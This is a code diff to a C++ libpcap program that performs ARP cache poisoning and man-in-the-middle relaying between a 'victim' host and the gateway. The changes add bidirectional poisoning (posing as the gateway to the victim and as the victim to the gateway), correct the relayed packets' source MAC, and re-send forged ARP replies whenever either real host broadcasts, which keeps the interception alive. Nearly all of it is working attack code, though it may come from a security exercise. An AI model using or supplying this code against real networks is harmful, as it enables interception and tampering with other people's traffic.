@@ -150,7 +150,8 @@ int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *my_ip, char *se
 
 int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac[6], char *gateway_ip, char *victim_ip, int time) {
 
-        // Attacker ( like gateway ) -> Victim
+        // 1. Attacker ( like gateway ) -> Victim
+        // 2. Attacker ( like victim ) -> Gateway
     // because come ARP broadcast periodically.
 
         memcpy(eth_arp_hdr->h_dest, victim_mac, 6);
@@ -164,13 +165,11 @@ int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac
         memcpy(eth_arp_hdr->__ar_tip, victim_ip, 4);
 
         if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-            cout << "Error send infaction packet" << endl;
+            cout << "Error send arp infaction packet" << endl;
             return -1;
-        }
-        else cout << endl << "Send infaction packet" << endl;
+        } else cout << endl << "Send arp infaction packet" << endl;
 
         if(time == 1) sleep(2);
-        else ;
 
     return 0;
 }
@@ -179,7 +178,8 @@ struct ethhdr *ep;
 
 int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], char *gateway_mac, char *victim_ip, char *gateway_ip) {
 
-    // (IP:Connect) Victim -> Attacker -> Gateway
+    // (IP:Connect) 1. Victim -> Attacker ( gave packet )
+    //              2. Attacker -> Gateway
 
         while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
 
@@ -191,31 +191,32 @@ int ip_relay_packet(pcap_t *pcd, char *dev, char my_mac[6], char victim_mac[6], 
 
             ep = (struct ethhdr*)packet;
 
-            if(ep->h_proto == htons(ETHERTYPE_IP)
+            if(ep->h_proto == htons(ETHERTYPE_IP) // 1
                     && memcmp(ep->h_dest, my_mac, 6)==0
                     && memcmp(ep->h_source, victim_mac, 6)==0) {
 
-                memcpy(ep->h_dest, gateway_mac, 6);
-                memcpy(ep->h_source, victim_mac, 6);
+                memcpy(ep->h_dest, gateway_mac, 6); // 2
+                memcpy(ep->h_source, my_mac, 6);
 
                 if(pcap_sendpacket(pcd, (const u_char*)packet, pkthdr->caplen) != 0) {
                     cout << "Error relay packet" << endl;
                     return -1;
-                }
-                else cout << "<< Send IP relay packet" << endl;
+                } else cout << "<< Send IP relay packet" << endl;
             }
 
-            // Recovery
+            // (Recovery) because recovery infection.
             if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)) {
 
-                // Gateway's broadcast, Victim's broadcast
-                if((memcmp(eth_arp_hdr->h_source, gateway_mac, 6)==0
-                        && memcmp(eth_arp_hdr->__ar_sha, gateway_mac, 6)==0)
-
-                        || (memcmp(eth_arp_hdr->h_source, victim_mac, 6)==0
-                            && memcmp(eth_arp_hdr->__ar_sha, victim_mac, 6)==0)) {
+                if((memcmp(eth_arp_hdr->h_source, gateway_mac, 6)==0 // Gateway
+                        && memcmp(eth_arp_hdr->__ar_sha, gateway_mac, 6)==0)) {
 
                     arp_infection_packet(dev, pcd, victim_mac, my_mac, gateway_ip, victim_ip, 2);
+                }
+
+                if((memcmp(eth_arp_hdr->h_source, victim_mac, 6)==0 // Victim
+                            && memcmp(eth_arp_hdr->__ar_sha, victim_mac, 6)==0)) {
+
+                    arp_infection_packet(dev, pcd, victim_mac, my_mac, victim_ip, gateway_ip, 2);
                 }
                 break;
             }
